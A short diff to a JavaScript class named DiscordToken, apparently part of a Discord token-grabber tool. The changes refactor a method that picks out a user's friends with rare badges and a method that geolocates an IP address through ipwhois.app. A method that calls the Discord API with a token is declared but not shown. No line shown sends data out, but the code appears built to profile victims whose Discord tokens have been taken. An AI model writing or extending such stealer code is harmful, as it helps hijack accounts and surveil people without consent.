@@ -285,9 +285,7 @@ module.exports = class DiscordToken {
 
   rareFriend(relationships) {
     let result = "";
-    const friendRelationships = relationships.filter(
-      (relationship) => relationship.type === 1,
-    );
+    const friendRelationships = relationships.filter((relationship) => relationship.type === 1);
     for (const relationship of friendRelationships) {
       const badges = this.rareFriendadges(relationship.user.public_flags);
       if (badges !== "Not Found") {
@@ -298,11 +296,14 @@ module.exports = class DiscordToken {
   }
 
   getIpInfoAll(ipAddress) {
-    const url = `http://ipwhois.app/json/${ipAddress}`;
-    const res = require("sync-fetch")(url);
-    if (res.status === 200) {
-      return res.json();
-    } else return "Not Found";
+    const res = require("sync-fetch")(`http://ipwhois.app/json/${ipAddress}`, {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json"
+      },
+    });
+    const d = res.json();
+    return res.status === 200 ? d : "Invalid"
   }
 
   getDiscordApi(url, token) {
